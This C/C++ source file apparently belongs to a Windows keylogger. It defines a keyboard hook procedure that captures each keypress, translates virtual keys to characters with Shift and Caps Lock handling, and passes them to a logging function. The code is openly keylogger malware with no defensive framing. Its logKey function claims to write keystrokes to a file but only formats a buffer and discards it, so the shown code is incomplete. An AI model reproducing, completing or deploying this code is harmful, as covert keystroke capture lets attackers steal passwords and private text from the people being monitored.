#include "KeyloggerProc.h"
#include <stdarg.h>

// return non-zero if the key pressed
static BOOL keyIsPressed(int vKey) {
    return (GetAsyncKeyState(vKey) & 0x8000) > 0;
}
// return true if a key is toggled (like CapsLock on)
static BOOL keyIsToggled(int vKey) {
    return GetKeyState(vKey) & 0x1;
}

// write typing keystrokes to a file
void logKey(char const* format, ...) {
    va_list vl;
    char buffer[BUFSIZE + 1] = { 0 };

    va_start(vl, format);
    vsprintf_s(buffer, BUFSIZE, format, vl);


    va_end(vl);
}

// keyboard event hook procedure implementation
LRESULT CALLBACK keyloggerProc(
    int    code,
    WPARAM wParam,
    LPARAM lParam
) {
    if (code < 0 || lParam & 0x40000000) { // pressed action only
        return CallNextHookEx(NULL, code, wParam, lParam);
    }
    if (keyIsPressed(VK_MENU) || keyIsPressed(VK_CONTROL) || wParam == VK_SHIFT) {  // Alt/Ctrl + otherKey || Shift key
        return CallNextHookEx(NULL, code, wParam, lParam);
    }
    
    if (vkeyToChars.find(wParam) != vkeyToChars.end()) {    // special chars
        logKey("[%s]", vkeyToChars.at(wParam));
        return 0;
    }

    BOOL isCapsLock = keyIsToggled(VK_CAPITAL);
    BOOL isShift = keyIsPressed(VK_SHIFT);

    if (isShift && (shiftKeyToChars.find(wParam) != shiftKeyToChars.end())) {    // Shift+convertable_key
        logKey(shiftKeyToChars.at(wParam));
        return 0;
    }

    // limitation: not taking into account the state of the SHIFT and CAPS LOCK keys (just individuals)
    // even does ToUnicode which takes the current virutal keystate
    char vkChar = MapVirtualKey(wParam, MAPVK_VK_TO_CHAR);
    if (vkChar != 0) {
        if ((isCapsLock ^ isShift) == 0) {
            vkChar = tolower(vkChar);
        }
        logKey("%c", vkChar);
    }
    
    return 0;   // non-zero values prevent from passing to the next in the chain or the target window proc
}